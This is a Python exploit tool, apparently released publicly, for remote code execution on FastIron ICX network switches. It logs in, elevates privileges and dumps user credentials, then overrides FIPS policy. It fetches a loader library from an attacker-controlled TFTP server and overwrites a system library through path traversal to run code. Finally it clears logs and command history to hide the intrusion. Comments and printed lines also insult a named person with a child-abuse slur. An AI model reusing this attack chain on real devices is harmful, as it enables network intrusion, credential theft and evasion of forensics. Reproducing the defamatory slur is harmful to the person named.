#!/usr/bin/env python3
# Copyright (C) 2025 ff794e44ea1c2b5211a3b07c57b5a3813f87f53ac10d78e56b16b79db6ff9615
#                    b726ae7cf45cc4dfa8de359caffb893209bca614d9387a7666b106052fba3e50
#
# This program is free software: you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the Free
# Software Foundation, either version 3 of the License, or (at your option)
# any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along with
# this program. If not, see <https://www.gnu.org/licenses/>.
#
# DMCA Security Research Exemption:
# Good faith security research conducted consistent with 17 U.S.C. ยง1201(j) and
# 37 CFR ยง201.40(b)(7) is explicitly permitted.
#
# This software is intended solely for educational, forensic, and lawful
# security research purposes. Any use of this software for offensive or harmful
# purposes is expressly prohibited.
#
# DISCLAIMER:
# The author disclaims any responsibility or liability for any direct, indirect,
# incidental, or consequential damages or losses resulting from the use or
# misuse of this software. Users bear full responsibility for compliance with
# applicable laws and regulations.
#
# Use, modification, or distribution constitutes explicit agreement to all terms
# above.

"""
Part of FLAPPYSWITCH: Raising the bar for enterprise network gear security...
   ...one exploit at a time.

  Bounty if sold to the usual suspects as a complete kit: ~100k-250k USD
  Laughing at the poor security in "top-tier" devices: unlimited
  Exposing vulnerabilities during the Salt Typhoon scandal for everyone's benefit:
     ...priceless!

This exploit is published freely for educational purposes - shedding light on the alarming
gaps in current network equipment and ensuring everyone (even the big guys) is held to
higher security standards.

After all, real improvements happen only when we confront the flaws head-on...
  especially if it's in the middle of a scandal!

This exploit uses astral projection to abuse a "physical access only" vector to
remotely execute arbitrary code in the underlying Linux OS in FastIron ICX switches.
Refer to the release notes for the loader that is required prior to executing the
attack against a vulnerable target. It can be easily modified to support other
vectors. Fighting planned obsolescence, this code will support EOL models, making
them relevant again. No shellcode needed, no offsets, no complex ROP chains, just
30 year old classic Unix exploitation tricks!

         >10 years worth of FastIron versions in one quick trick!

        <x> hearing an annoying noise for the last hour or so
        <y> oh, it's all the industry consulting shops rubbing their hands before
            sending their sales goons with their hitler youth haircuts, macbooks
            and brooks brothers uniforms to commscope!
        <x> huehuehuehue
"""

import argparse
import queue
import re
import threading
import socket
import struct
import time
import sys
import logging
from taoftp import TaoFTP, taoftp_shell_handler
from internals import parse_cpld_registers, dump_cpld_info, extract_eeprom_info
from pwn import log

# For SSH support; install with: pip install paramiko
try:
    import paramiko
except ImportError:
    print("Error: paramiko module not found. Install with 'pip install paramiko'")
    sys.exit(1)

LOADER_MARKER = b"\x43\x48\x4f\x4d\x4f\x56\x41\x55\x4c\x54"

def get_major_version(version_string):
    match = re.match(r"(\d+)", version_string)
    if match:
        return int(match.group(1))

    return None

def parse_crypto_module_info(output: str) -> dict:
    """
    Parse the cryptographic module output and return a dictionary with:
      - cryptographic_module_version (str)
      - fips_admin (bool)
      - fips_operational (bool)
      - cc_admin (bool)
      - cc_operational (bool)
    """
    result = {}

    # Extract the cryptographic module version.
    m = re.search(r"Cryptographic Module Version:\s*(?P<version>\S+)", output)
    if m:
        result["cryptographic_module_version"] = m.group("version")

    # Extract FIPS mode statuses.
    m = re.search(
        r"FIPS mode:\s*Administrative status\s+(?P<fips_admin>ON|OFF):\s*Operational status\s+(?P<fips_operational>ON|OFF)",
        output)
    if m:
        result["fips_admin"] = m.group("fips_admin") == "ON"
        result["fips_operational"] = m.group("fips_operational") == "ON"

    # Extract Common-Criteria statuses.
    m = re.search(
        r"Common-Criteria:\s*Administrative status\s+(?P<cc_admin>ON|OFF):\s*Operational status\s+(?P<cc_operational>ON|OFF)",
        output)
    if m:
        result["cc_admin"] = m.group("cc_admin") == "ON"
        result["cc_operational"] = m.group("cc_operational") == "ON"

    return result

def parse_users(output: str) -> list:
    """
    Parse user details from the given output and return a list of dictionaries.

    Expected columns:
      - Username
      - Password
      - Encrypt
      - Priv
      - Status
      - Expire Time
    """
    users = []
    lines = output.strip().splitlines()
    data_lines = [line for line in lines if not (line.startswith("Username") or re.match(r"=+", line))]

    pattern = re.compile(
        r"^(?P<username>\S+)\s+"
        r"(?P<password>\S+)\s+"
        r"(?P<encrypt>\S+)\s+"
        r"(?P<priv>\S+)\s+"
        r"(?P<status>\S+)\s+"
        r"(?P<expire>.+)$"
    )

    for line in data_lines:
        m = pattern.match(line)
        if m:
            user = m.groupdict()
            user["expire"] = user["expire"].strip()
            users.append(user)

    return users

def extract_version_info(output):
    data = {}

    m = re.search(r"SW:\s*Version\s+(\S+)", output)
    if m:
        data["firmware_version"] = m.group(1)

    m = re.search(
        r"Compressed\s+(\S+)\s+Boot Code size\s*=\s*(\d+),\s*Version:(\S+)\s*\(([^)]+)\)",
        output)
    if m:
        data["bootloader"] = {
            "location": m.group(1),
            "code_size": int(m.group(2)),
            "version": m.group(3),
            "name": m.group(4)
        }

    m = re.search(
        r"\((\d+)\s+bytes\)\s+from\s+(\S+)\s+(\S+\.bin)\s+\(UFI\)",
        output)
    if m:
        data["partition"] = {
            "size": int(m.group(1)),
            "partition": m.group(2),
            "firmware_filename": m.group(3)
        }

    m = re.search(r"labeled\s+as\s+(\S+)", output)
    if m:
        data["firmware_label"] = m.group(1)

    m = re.search(r"Serial\s+#:([\w\d]+)", output)
    if m:
        data["serial_number"] = m.group(1)

    m = re.search(r"HW:\s*(.+)", output)
    if m:
        data["hw"] = m.group(1).splitlines()[0].strip()

    m = re.search(r"P-ASIC\s+\d+:\s*(.+)", output)
    if m:
        data["fpga"] = m.group(1).strip()

    m = re.search(r"system uptime is\s+(.+)$", output, re.MULTILINE)
    if m:
        data["uptime"] = m.group(1).strip()

    return data

def parse_routes(output: str) -> list:
    """
    Parse route details from the provided output and return a list of dictionaries.

    Each route dict contains:
      - vr (int)
      - prefix (str)
      - nh (int)
      - nh_hw (int)
      - cmd (str)
      - vlan (int)
      - l3_intf (int)
      - classid (int)
      - routehit (str)
    """
    # This regex matches a route line.
    pattern = re.compile(
        r"vr:\s*(?P<vr>\d+)\s+(?P<prefix>\S+)\s+NH:\s*(?P<nh>\d+)\s+NH\s+hw:\s*(?P<nh_hw>\d+)\s+"
        r"cmd:\s*(?P<cmd>\S+),\s+Outgoing\s+vlan:\s*(?P<vlan>\d+),\s+L3\s+intf:\s*(?P<l3_intf>\d+)\s+"
        r"ClassId:\s*(?P<classid>\d+)\s+RouteHit:\s*(?P<routehit>\S+)"
    )

    routes = []
    for match in pattern.finditer(output):
        route = match.groupdict()
        # Convert numeric fields to int.
        for key in ["vr", "nh", "nh_hw", "vlan", "l3_intf", "classid"]:
            route[key] = int(route[key])
        routes.append(route)

    return routes

class SSHConnection:
    """Encapsulates an SSH connection using Paramiko."""
    def __init__(self, host, port, username, password, use_public_keys=False):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        disabled_algs = {
            'kex': [
                'ecdh-sha2-nistp256',
                'ecdh-sha2-nistp384',
                'ecdh-sha2-nistp521',
                'diffie-hellman-group-exchange-sha256'
            ],
            'pubkeys': [
                'ecdsa-sha2-nistp256',
                'ecdsa-sha2-nistp384',
                'ecdsa-sha2-nistp521',
                'ssh-ed25519'
            ]
        }

        if not password:
            self.password = None
        else:
            self.password = password

        self.username = username

        connect_args = dict(
            hostname=host,
            port=port,
            username=self.username,
            allow_agent=use_public_keys,
            look_for_keys=use_public_keys,
            disabled_algorithms=disabled_algs
        )
        if self.password is not None:
            connect_args["password"] = self.password

        with log.progress("Connecting via SSH") as p:
            try:
                self.client.connect(**connect_args)
                p.status(f"connection established to {host}:{port} as user '{self.username}'")
            except Exception as e:
                if self.password is None and "No authentication methods available" in str(e):
                    p.status("initial auth failed; attempting explicit 'none' authentication.")
                    transport = self.client.get_transport()
                    if transport is None:
                        p.failure("Transport is unavailable.")
                        sys.exit(1)
                    try:
                        transport.auth_none(self.username)
                        if transport.is_authenticated():
                            p.success(f"connection established to {host}:{port} as user '{self.username}' using 'none' authentication.")
                        else:
                            p.failure("Explicit 'none' authentication failed.")
                            sys.exit(1)
                    except Exception as e2:
                        p.failure(f"'none' authentication failed: {e2}")
                        sys.exit(1)
                else:
                    p.failure(f"SSH connection failed: {e}")
                    sys.exit(1)

        with log.progress("Opening interactive SSH shell") as p:
            try:
                self.shell = self.client.invoke_shell()
                time.sleep(1)
                initial_output = self.shell.recv(10000).decode('utf-8', errors='ignore')
                p.success("session opened.")
            except Exception as e:
                p.failure(f"Failed to open interactive shell: {e}")
                sys.exit(1)

    def flush_shell_buffer(self, timeout=0.5):
        """
        Flush any residual data in the shell's buffer.
        Waits for 'timeout' seconds and then reads until no more data is available.
        """
        time.sleep(timeout)
        flushed = ""
        while self.shell.recv_ready():
            flushed += self.shell.recv(10000).decode('utf-8', errors='ignore')
        return flushed

    def execute(self, command, expected=None, no_command=False):
        """
        Execute a command by sending it over the interactive shell.
        Wait briefly for output and return the collected result.
        """
        try:
            if not no_command:
                self.shell.send(command + "\n")

            output = ""
            max_timeout = 5
            idle_timeout = 0.5
            end_time = time.time() + max_timeout

            while True:
                if self.shell.recv_ready():
                    end_time = time.time() + idle_timeout
                    chunk = self.shell.recv(10000).decode('utf-8', errors='ignore')
                    output += chunk
                else:
                    if time.time() > end_time:
                        break
                    time.sleep(0.2)

            # Split the output into lines.
            lines = output.splitlines()

            # Remove the echoed command if it appears in the first line.
            if lines and command.strip() in lines[0]:
                lines.pop(0)

            # This pattern captures the hostname in group(1) and the prompt character in group(2).
            prompt_pattern = re.compile(r"^SSH@(\S+)(?:.*)([>#])\s*$")

            # Check the last line for a prompt and remove it.
            if lines:
                last_line = lines[-1].strip()
                m = prompt_pattern.match(last_line)
                if m:
                    # Capture the hostname.
                    self.hostname = m.group(1)
                    # Mark as elevated if the prompt ends with '#' instead of '>'.
                    self.elevated = (m.group(2) == "#")
                    # Remove the prompt line.
                    lines.pop()
                else:
                    self.elevated = False
                    self.hostname = None

                for line in lines:
                    m = prompt_pattern.match(line)
                    if m:
                        lines.remove(line)

            # Reassemble the output without the echoed command and prompt.
            if len(lines) > 1:
                output = "\n".join(lines)
            else:
                output = "".join(lines)

            log.debug(f"command {command}: --> {output}")
        except Exception as e:
            log.warn(f"[!] Error during command execution: {e}")
            output = ""
        if expected is not None:
            verified = expected in output
            return (verified, output)
        return (True, output)

    def execute_until(self, command, expected, max_timeout=30, poll_interval=0.2):
        """
        Sends a command and reads from the shell until the expected string is found
        in the output or the max timeout is reached.
        """
        self.shell.send(command + "\n")
        output = ""
        start_time = time.time()
        while expected not in output:
            if self.shell.recv_ready():
                chunk = self.shell.recv(10000).decode('utf-8', errors='ignore')
                output += chunk
            if time.time() - start_time > max_timeout:
                break
            time.sleep(poll_interval)
        return output

    def close(self):
        self.client.close()


class TelnetConnection:
    """Encapsulates a Telnet connection using sockets."""
    def __init__(self, host, port, timeout=10):
        try:
            self.sock = socket.create_connection((host, port), timeout)
            self.sock.settimeout(1.0)
            log.info(f"Telnet connection established to {host}:{port}")
        except Exception as e:
            log.error(f"Telnet connection failed: {e}")
            sys.exit(1)
        self.hostname = None
        self.elevated = False

    def execute(self, command, expected=None):
        """
        Send a command over Telnet and verify the response.
        Returns a tuple: (verified, output)
        """
        try:
            self.sock.sendall(f"{command}\n".encode('ascii'))
        except Exception as e:
            log.error(f"Error sending command: {e}")
            return (False, "")

        time.sleep(1)

        self.sock.settimeout(0.5)
        output_bytes = b""
        while True:
            try:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                output_bytes += chunk
            except socket.timeout:
                break
            except Exception as e:
                log.error(f"Error reading from socket: {e}")
                break

        self.sock.settimeout(1.0)

        try:
            output = output_bytes.decode('ascii', errors='ignore')
        except Exception as e:
            log.error(f"Error decoding output: {e}")
            output = ""

        lines = output.splitlines()
        if lines and command.strip() in lines[0]:
            lines.pop(0)

        prompt_pattern = re.compile(r"^telnet@(\S+)(?:.*)([>#])\s*$")
        if lines:
            last_line = lines[-1].strip()
            m = prompt_pattern.match(last_line)
            if m:
                self.hostname = m.group(1)
                self.elevated = (m.group(2) == "#")
                lines.pop()
            else:
                self.hostname = None
                self.elevated = False

        verified = True
        if expected is not None:
            verified = (expected in output)

        return (verified, "\n".join(lines).strip())

    def close(self):
        try:
            self.sock.close()
        except Exception as e:
            log.error(f"Error closing socket: {e}")

class SchomeSchulto:
    UNFORTUNATE_NAME_CHOICES = "\x74\x77\x6f\x36\x69\x78\x39\x69\x6e\x65\x74\x65\x63\x68\x77\x61\x72\x65\x7a"

    def __init__(self, connection, server_type=None, server_thread=None,
                 server_port : int = None,
                 msg_queue : queue.Queue = None,
                 tftpd_host : str = None):
        self.connection = connection
        self.closed = False
        self.elevated = False
        self.is_fips = False
        self.hw = None
        self.current_firmware = None
        self.bootloader = None
        self.hostname = None
        self.raw_data = {}
        self.enable_password = None
        self.enable_username = None
        self.msg_queue = msg_queue
        self.redact = False
        self.tftpd_host = tftpd_host
        self.exec_trigger_event = threading.Event()

        self.server_type = server_type
        self.server_thread = server_thread

    def enable_redaction(self):
        self.redact = True

    def set_taoftp_remote(self, host : str):
        self.tftpd_host = host

    def set_enable_password(self, password : str):
        self.enable_password = password

    def elevate(self, max_retries=2):
        with log.progress(f"Elevating shell") as p:
            attempts = 0
            while True:
                if attempts == 0:
                    just_read = False
                    p.status(f"sending command")
                else:
                    just_read = True
                    p.status(f"waiting")

                verified, output = self.connection.execute("enable", no_command=just_read)
                output = output.strip()

                if output == "No password has been assigned yet...":
                    p.success("obtained elevated cli access! (no password)")
                    self.elevated = self.connection.elevated
                    return True
                else:
                    if "Enable Password:" in output:
                        p.status(f"sending enable password")

                        _, output = self.connection.execute(self.enable_password)
                        output = output.strip()

                        if output == "":
                            _, output = self.connection.execute("\n")
                        elif "Incorrect username or password." in output:
                            p.failure("Incorrect credentials!")
                            return False

                        if self.connection.elevated:
                            p.success(f"obtained elevated cli shell")
                            self.elevated = self.connection.elevated
                            return True
                    elif "Login:" in output:
                        p.status(f"local auth for enable")
                        if isinstance(self.connection, SSHConnection):
                            self.enable_username = self.connection.username
                            if not self.enable_password:
                                self.enable_password = self.connection.password
                        else:
                            raise NotImplemented(f"must pass local auth credentials")

                        p.status(f"sending username")
                        _, output = self.connection.execute(self.enable_username)
                        output = output.strip()
                        if "Password:" in output:
                            p.status(f"sending password")
                            if self.connection.password and self.connection.password != self.enable_password:
                                password = self.connection.password
                            else:
                                password = self.enable_password

                            _, output = self.connection.execute(password)
                            output = output.strip()

                            if "Incorrect username or password" not in output:
                                p.success("logged in")
                                self.elevated = self.connection.elevated
                                return True
                            else:
                                p.failure("auth failed")
                                return False
                    else:
                        if attempts > max_retries:
                            p.failure("Unknown output:")
                            log.error(output)
                            return False
                        else:
                            attempts += 1
                            continue


        return False

    def recon(self):
        with log.progress("Gathering target version...") as p:
            #_, version_output = self.connection.execute("show version")
            _, version_output = (True, self.connection.execute_until(
                f"show version",
                "SW: Version"
            ))

            try:
                # Populate the raw dict first
                tmpdata = extract_version_info(version_output.strip())
                self.raw_data.update(tmpdata)

                self.hostname = self.connection.hostname
                self.fw_label = tmpdata['firmware_label']
                self.full_version = tmpdata['firmware_version']
                self.boot_partition = tmpdata['partition']['partition']
                self.bootloader = tmpdata['bootloader']['name']
                self.hw = tmpdata.get('hw', None)
                self.sn = tmpdata.get('serial_number', None)
                self.fpga = tmpdata.get('fpga', None)

                log.info(f"Target on v.{self.full_version} ({self.fw_label}) from {self.boot_partition})")

                if self.hw:
                    log.info(f"Target HW: {self.hw}")

                if self.fpga:
                    log.info(f"ASIC/FPGA: {self.fpga}")

                p.success(f"v.{self.full_version} ({self.fw_label})")
            except Exception as e:
                p.failure(f"exception: {e}")
                log.error(f"Output:\n {version_output}")

        # Help flush the shell output
        self.connection.execute("\n" * 2)

        with log.progress("Retrieving routes for ASIC/FPGA...") as p:
            try:
                p.status("sending command")
                _, routes_output = self.connection.execute("show hardware route device 0")
                if "Warning!!! This command execution" in routes_output.strip():
                    _, routes_output = self.connection.execute("y")

                p.status("parsing response")
                routes = parse_routes(routes_output.strip())
                self.raw_data['routes'] = routes

                if self.raw_data['routes']:
                    route_count = len(self.raw_data['routes'])
                    p.success(f"retrieved {route_count} routes in target's HW")
                    dump = "Routes:\n"
                    for route in routes:
                        dump += f" -> {route['prefix']} cmd:{route['cmd']} vlan:{route['vlan']} hit? {route['routehit']}\n"

                    log.info(dump)
            except:
                p.failure("failed, route information could not be gathered.")

        # Gather the user list
        with log.progress("Retrieving users...") as p:
            try:
                p.status("sending command")
                _, users_output = self.connection.execute("show users")

                p.status("parsing response")
                self.users = parse_users(users_output.strip())
            except Exception as e:
                self.users = None
                p.failure(f"exception: {e}")

            if self.users:
                p.success(f"retrieved {len(self.users)} users:")
                dump = "Users:\n"
                for user in self.users:
                    dump += f" {user['username']}:{user['password']} priv:{user['priv']} ({user['status']})\n"
                log.info(dump)

        if self.elevated:
            self.clear()

        return True

    def into_config_mode(self, progress):
        progress.status(f"going into config mode")
        _, output = self.connection.execute("configure terminal")
        output = output.strip()
        if len(output) == 0:
            progress.status("in config mode")
            return True

        progress.status("failed to switch into config mode")
        return False

    def handle_fips_lol(self):
        with log.progress("Retrieving FIPS/CC status") as p:
            p.status("sending command")

            _, fips_output = self.connection.execute("fips show")
            self.fips_status = parse_crypto_module_info(fips_output.strip())

            # How to turn 300k worth of trust into smoke in one quick trick
            if self.fips_status['fips_operational'] or self.fips_status['fips_admin']:
                p.status(f"target has FIPS/CC mode enabled!")

                # Go into configure mode
                self.into_config_mode(p)

                p.status(f"FIPS/CC enabled, applying policy override :-)")
                _, output = self.connection.execute("fips policy allow monitor-full-access")
                if output != "":
                    log.info(output)

                # Revert back out of config mode
                _, output = self.connection.execute("exit")
                if output != "":
                    log.info(output)

                p.success("FIPS/CC enabled, applied override.")
                return True
            else:
                p.success("FIPS/CC mode not operational (disabled)")
                return False

    def trigger_write_primitive(self):
        with log.progress("Delivering loader payload") as p:
            tftpd_host = self.tftpd_host
            target_filename = self.UNFORTUNATE_NAME_CHOICES

            p.status(f"copying loader")
            if get_major_version(self.full_version) > 8:
                p.status("adjusting for 9.x-10.x")
                _, cmd_output = self.connection.execute(f"copy tftp flash {tftpd_host} {target_filename} ssl-trust-cert")
                cmd_output = cmd_output.strip()
                success_mark = "Parameter Validation Successful"
            else:
                p.status("adjusting for 8.x")
                _, cmd_output = self.connection.execute(f"copy tftp flash {tftpd_host} {target_filename} trust-certificate")
                cmd_output = cmd_output.strip()
                success_mark = "TFTP to Flash Done."

            while cmd_output == "":
                _, cmd_output = self.connection.execute("\n")
                cmd_output = cmd_output.strip()

            if success_mark in cmd_output:
                p.success(f"loader DSO copied to target!")
                return True
            else:
                p.failure(f"loader delivery failed")
                log.warn(f"expected: {success_mark}")
                log.warn(cmd_output)
                return False

    def trigger_exec_primitive(self, targetdso="libm.so.6", wait_timeout=60):
        with log.progress("Triggering DSO overwrite with loader") as p:
            srcpath = self.UNFORTUNATE_NAME_CHOICES

            p.status("Waiting for loader xfer confirmation...")
            if not self.exec_trigger_event.wait(wait_timeout):
                p.failure("Timeout waiting for xfer confirmation.")
                return False

            p.status("ready!")

            if get_major_version(self.full_version) > 8:
                log.info(f"Adjusting for => 9.x ({self.full_version})")
                self.connection.execute("\n")

                p.status(f"copying loader to intermediate path")

                #_, cp_output = self.connection.execute(f"dm flash copy {srcpath} ../../lib/{targetdso}.tmp")
                _, cp_output = (True, self.connection.execute_until(
                    f"dm flash copy {srcpath} ../../lib/{targetdso}.tmp",
                    "copy Done"
                ))

                if "copy Done" not in cp_output.strip():
                    log.warn(f"Unexpected copy result: {cp_output}")
                    return False

                p.status(f"unlinking {targetdso}")
                unlink_cmd = f"dm flash delete ../../lib/{targetdso}"
                _, rm_output = self.connection.execute(unlink_cmd)
                if f"Flash file ../../lib/{targetdso} deleted." not in rm_output:
                    log.warn(f"Unexpected unlink result: {rm_output}")
                    return False

                # Any delays in this step can break the current state
                # Left as is for public release :-)
                p.status(f"triggering loader")
                _, mv_output = self.connection.execute(f"dm flash rename ../../lib/{targetdso}.tmp ../../lib/{targetdso}")
                return True
            else:
                log.info(f"Adjusting for 8.x ({self.full_version})")

                p.status(f"unlinking {targetdso}")
                _, rm_output = self.connection.execute(f"dm flash delete ../../{targetdso}")
                log.info(rm_output)

                p.status(f"replacing {targetdso}")
                _, cp_output = self.connection.execute(f"dm flash copy {srcpath} ../../{targetdso}")
                log.info(rm_output)

                if "deleted" in rm_output.strip():
                    p.success(f"replaced target DSO!")
                    return True

            return False

    def build_cfgpack(self):
        return b""

    def clear(self):
        with log.progress("Cleaning logs") as p:
            p.status("cleaning logs")
            self.connection.execute("clear logging")
            p.status("cleaning cli command history")
            self.connection.execute("clear cli-command-history")
            p.success("cleaner than Epstein's CCTV recorder!")


    def go(self):
        successful = False

        if self.elevate():
            self.connection.execute("skip")

            # need PRIV EXEC for 'skip'
            self.recon()

            log.info("Verifying FIPS/CC status...")
            if self.handle_fips_lol():
                self.is_fips = True
            else:
                log.info("Target is not in FIPS/CC mode!")
                self.is_fips = False

            log.info("Using 'astral projection' to abuse the 'physical access only' vector...")
            if not self.trigger_write_primitive():
                log.error("Failed to write loader!")

            log.info("Waiting for confirmation...")

            print("  <x> wikileaks really missed the chance to call it 'chomo vault'")
            print("  <y> not to be trusted with yo kidz, but he could get a TS/SCI clearance no prob")
            print("  <z> 'here lies jschulte, the first bioluminescent chomo engineered in a supersecret SCIF'")
            print("  <OneManAPT> to solemnly paraphrase degrasse, 'this universe is a strange place'")

            if self.msg_queue:
                max_transfer_timeout = 30
                end_time = time.time() + max_transfer_timeout

                while True:
                    msgtype, remote, xtra = self.msg_queue.get(timeout=120)
                    log.debug(f"Got message in queue: {msgtype} with arg {xtra} from {remote}")

                    if time.time() > end_time:
                        log.failure(f"Timeout waiting for TaoFTP xfer confirmation :(")
                        break

                    # upon completion taoftp will push a "completed" msg
                    if msgtype and isinstance(msgtype, str):
                        remote_host, remote_port = remote
                        if msgtype == "completed":
                            log.success(f"Delivered payload to {remote_host}:{remote_port}")
                            self.exec_trigger_event.set()
                            if self.trigger_exec_primitive():
                                log.info("Done! Loader should be executed soon.")
                                self.clear()
                                self.close()
                                successful = True
                                break
                        elif msgtype == "new_session":
                            log.info(f"Stray TaoFTP session incoming? (from {remote_host}:{remote_port})")
                            continue
                        elif msgtype == "session_ended":
                            log.debug(f"Stray TaoFTP session ended? (from {remote_host}:{remote_port})")
                            continue
                    else:
                        log.warn(f"Unknown message in queue: {msgtype} ({remote})")
                        break

        self.close()
        return False

    def close(self):
        if not self.closed:
            self.connection.close()
            self.closed = True

    def device_data_callback(self, session_id : int,
                             device_id : int, device_data : bytes, client_addr):
        if device_id == 0:
            log.info(f"Got EEPROM data for {client_addr}")
            info, device_data = extract_eeprom_info(device_data, self.redact)
            log.hexdump(device_data)
        elif device_id == 1:
            log.success(f"Got system CPLD data for {client_addr}"
                        )
            regs = parse_cpld_registers(device_data)
            max_key_length = max(len(key) for key in regs.keys())
            regdump = ""
            for key, value in regs.items():
                regdump += f"  {key.ljust(max_key_length)} : {value:#01x}\n"

            dump_cpld_info(regs)
            log.info(f"Raw registers:\n{regdump}")

            log.info("Raw data:")
            log.hexdump(device_data)
        else:
            log.info(f"Got unknown device data for {client_addr}")
            log.hexdump(device_data)


def main():
    parser = argparse.ArgumentParser(
        description="Astral projection tool: put yourself in front of a FastIron ICX, from miles away (tm)")
    parser.add_argument("host", help="Remote host address")
    parser.add_argument("port", type=int, help="Remote port")
    parser.add_argument("mode", choices=["ssh", "telnet"], help="Connection mode (ssh or telnet)")
    parser.add_argument("--server", choices=["tftp"],
                        help="Run built-in server mode of specified type (tftp)")
    parser.add_argument("--loader", help="DSO to serve with the built-in server (required if --server is specified)")
    parser.add_argument("--server-port", type=int,
                        help="Port for built-in server mode (default: 169 for TFTP)")
    parser.add_argument("--server-addr", type=int,
                        help="Address for TFTP server (must be reachable by target)")
    parser.add_argument("--username", help="Username for SSH (default: root)", default="root")
    parser.add_argument("--password", help="Password for SSH (default: empty for none)", default="")
    parser.add_argument("--enable-password", help="Password for enable (aka super user password)", default="")
    parser.add_argument("--use-public-keys", action="store_true",
                        help="Enable public key authentication (disabled by default)")
    parser.add_argument("--debug", action="store_true",
                        help="Enable verbose debug output")
    parser.add_argument("--tftp-remote", help="IP address for the TaoFTP instance")
    parser.add_argument("--redact", action="store_true",
                        help="Enable redaction mode (conceal details in output)")
    args = parser.parse_args()

    if args.debug:
        logging.basicConfig(level=logging.DEBUG)
        paramiko.util.log_to_file("paramiko_debug.log", level=logging.DEBUG)
        print("Debug logging enabled.")

    # Start built-in server if specified.
    server_thread = None
    server_port = None
    taoftp_queue = queue.Queue()

    if args.server:
        server = None

        if not args.loader:
            parser.error("When --server is specified, --loader must be provided.")
        if args.server_port:
            server_port = args.server_port
        else:
            server_port = 6969

        if args.server == "tftp":
            server = TaoFTP(args.loader, host="0.0.0.0", port=server_port, msg_queue=taoftp_queue)
        else:
            raise NotImplementedError("Only TFTP is supported in this version!")

        server_thread = threading.Thread(target=server.start,
                            args=(),
                            daemon=True)
        server_thread.start()

    if not args.tftp_remote:
        parser.error("--tftp-remote must be provided.")


    # Establish the remote connection.
    if args.mode.lower() == "ssh":
        connection = SSHConnection(args.host, args.port, args.username,
                                   args.password, use_public_keys=args.use_public_keys)
    else:
        connection = TelnetConnection(args.host, args.port)

    expl = SchomeSchulto(connection, args.server, server, server_port, taoftp_queue, args.tftp_remote)

    server.set_device_data_callback(expl.device_data_callback)
    if args.redact:
        expl.enable_redaction()

    expl.set_taoftp_remote(args.tftp_remote)
    expl.set_enable_password(args.enable_password)

    xtracfg = expl.build_cfgpack()
    cfgpack = server.pack_configuration(1, 0, [ args.tftp_remote ] * 4, xtracfg)
    server.set_marker(LOADER_MARKER, 256)
    server.patch_marker(cfgpack, pad_random=True, marker=LOADER_MARKER)

    expl.go()
    taoftp_shell_handler(server, taoftp_queue)

    expl.close()


if __name__ == "__main__":
    main()
